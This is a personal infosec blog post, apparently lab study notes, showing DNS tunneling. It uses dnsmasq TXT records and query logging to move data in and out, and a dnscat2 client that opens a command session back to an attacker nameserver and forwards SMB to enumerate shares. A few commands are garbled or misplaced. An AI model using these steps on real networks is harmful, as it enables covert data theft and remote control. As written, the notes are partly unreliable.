---
layout: post
title: DNS Tunneling
titledate: 09/24/23
tags: ["infosec", "info_gathering", "offsec", "tunnel", "dnsmasq", "dnscat2"]
---

#### dns queries and exfiltration

let's say we have shell access to target1 a windows machine that can talk to the internal psql db and another WAN connected machine that can only talk to target1

if we have shell access to both machines we may want to make the external connected WAN machine a dns server and we can do this with dnsmasq

inside our WAN linux machine shell we configure dnsmasq

    $ cat dnsmasq.conf

    - auth-zone=feline.corp
    - auth-server=feline.corp

start the service 

    $ sudo dnsmasq -C dnsmasq.conf -d

inside another shell on our newly configured dns server we start listening on the interface

    $ sudo tcpdump -i ens192 udp port 53

now on our internal pg db machine we start making dns queries aimed at our WAN dns server we setup

    $ resolvectl status

let's make a dns request using our newly created domain

    $ nslookup ex-data.feline.corp

it cannot find our domain because it hasnt been configured yet

if we check our tcpdump activity we'll seee a dns request that's because our target1 windows machine knows the authoritative name server belogs to our WAN machine and forwards the request along

this shows how we can send small amounts of data from inside the network to an externa machine we can control

#### serving records and infiltrating

now let's kill the dnsmasq process we started above and try to serve txt records

edit the dnsmasq.conf 

    $ vim cat dnsmasq_txt.conf
    
    # TXT record
    txt-record=www.feline.corp,blah blah
    txt-record=www.feline.corp,blah blah something

restart using our new conf

    $ sudo dnsmasq -C dnsmasq_txt.conf -d

now back on our internally connected pg db system we can make a dns query for a txt record

    $ nslookup -type=txt www.feline.corp

and this is how we can infiltrate a network using dns

#### dnscat2

dnscat2 allows us to exfiltrate and infiltrate data

dnscat2 runs on an authoritative nameserver for a domain and any client queries for that domain are compromised

let's listen on port 53

    $ sudo tcpdump -i ens192 udp port 53

start the dnscat2 server

    $nameserver:> dnscat2-server feline.corp

now inside our INTERNAL pg db machine we run

    $pgdb:> ./dnscat feline.corp

if we run dnscat2 server now on our nameserver we shold see an established connection

    $nameserver:> ./dnscat feline.corp

simiar to metasploit we can now interact with this session

if we enter

    $ windows

    $ window -i 1

this will connect to our pg db session and list available commands

we can tunnel smb traffic through dns requests

    $ listen 127.0.0.1:4455 172.16.50.50:445

then in another shell we can enumerate these shares on on our internal smb machine through the port forward we have setup

    $ smbclient -p 4455 -L //127.0.0.1 -U admin --password=password